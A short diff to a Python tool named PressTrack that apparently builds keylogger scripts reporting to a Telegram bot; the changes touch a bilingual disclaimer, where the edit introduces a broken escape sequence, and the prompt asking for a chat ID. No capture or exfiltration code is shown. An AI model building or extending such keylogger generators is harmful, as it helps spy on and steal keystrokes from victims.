@@ -6,7 +6,7 @@ from pyfiglet import figlet_format
 # Tool Bilgileri
 TOOL_NAME = "PressTrack"
 AUTHOR = "NewOnlySquad"
-DISCLAIMER_TR = "\033[1;31m[!] Bu araç yalnızca eğitim amaçlıdır. Illegal aktivitelerden sorumlu değiliz.\033[0m"
+DISCLAIMER_TR = "\0133[1;31m[!] Bu araç yalnızca eğitim amaçlıdır. Illegal aktivitelerden sorumlu değiliz.\033[0m"
 DISCLAIMER_EN = "\033[1;31m[!] This tool is for educational purposes only. We are not responsible for any illegal activities.\033[0m"
 
 HELP_TEXT_TR = """
@@ -61,7 +61,7 @@ def show_help(lang):
 
 def get_user_input(lang):
     bildiri = input("[+] {}: ".format("Lütfen önce https://t.me/Key_Logger_MyBOT bu botu telegram hesabınızdan başlatın." if lang == "tr" else "Please Start This Bot From Your Telegram Account(https://t.me/Key_Logger_MyBOT)"))
-    chat_id = input("[+] Telegram Chat ID: ")
+    chat_id = input("[+] {}: ".format("Chat id yi keylogger.py dosyası içindeki değişkenden değiştirin bir kez yapmanız yeterlidir." if lang == "tr" else "Change the chat ID from the variable inside the keylogger.py file, doing it once is enough."))
     file_name = input("[+] {}: ".format("Kaydedilecek dosya adı (örneğin: my_keylogger.py)" if lang == "tr" else "Filename for the script (e.g., my_keylogger.py)"))
     logo_path = input("[+] {}: ".format("Bir logo eklemek ister misiniz? (Dosya yolu, boş geçmek için Enter)" if lang == "tr" else "Would you like to add a logo? (File path, press Enter to skip)"))
     return chat_id, file_name, logo_path
